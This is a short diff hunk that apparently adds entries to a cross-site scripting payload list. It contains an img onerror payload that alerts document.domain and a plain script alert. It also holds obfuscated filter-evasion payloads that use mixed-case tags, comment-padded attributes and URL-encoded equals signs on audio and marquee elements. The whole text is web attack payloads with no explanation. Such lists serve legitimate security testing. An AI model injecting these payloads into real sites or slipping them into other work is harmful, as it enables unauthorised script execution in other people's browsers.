@@ -1,3 +1,7 @@
+<img src=x onerror=alert(document.domain)>
+
+<script>alert(1);</script>
+
 <AuDiO/**/oNLoaDStaRt='(_=/**/confirm/**/(1))'/src><!--renwax23
 
 <mArquee onStart%3D[~[onmouseleave(([[(alert(1))]]))]] ]
